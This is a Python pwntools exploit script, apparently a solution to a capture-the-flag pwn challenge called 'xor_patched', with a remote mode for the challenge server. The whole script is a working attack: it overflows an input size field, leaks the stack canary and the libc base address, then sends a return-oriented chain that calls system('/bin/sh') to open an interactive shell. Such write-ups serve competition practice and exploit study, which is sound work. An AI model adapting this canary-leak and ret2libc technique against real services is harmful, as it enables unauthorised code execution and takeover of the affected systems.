#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./xor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "pwn.chal.ctf.gdgalgiers.com", "1400"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# write 'y' for early exit of input_size, and set size to 0x200
payload = 'y'*0x98+p64(0x200)
sla('name: ', payload)

# leak stack
sla('Choice: ', '4')
buff = p.recvuntil('Current',drop=True)
canary = u64(buff[0x60:0x68])
print('canary = '+hex(canary))
libc.address = u64(buff[0x90:0x98]) - 0x29d90
print('libc base = '+hex(libc.address))

rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# write payload to stack
payload = 'A'*0x58+p64(canary)+p64(0xdeadbeef)
payload += p64(ret)+p64(pop_rdi)+p64(next(libc.search('/bin/sh')))+p64(libc.sym['system'])
sla('Choice: ','1')
sla('bytes: ', payload)

# return to ROP
sla('Choice: ','0')

p.interactive()

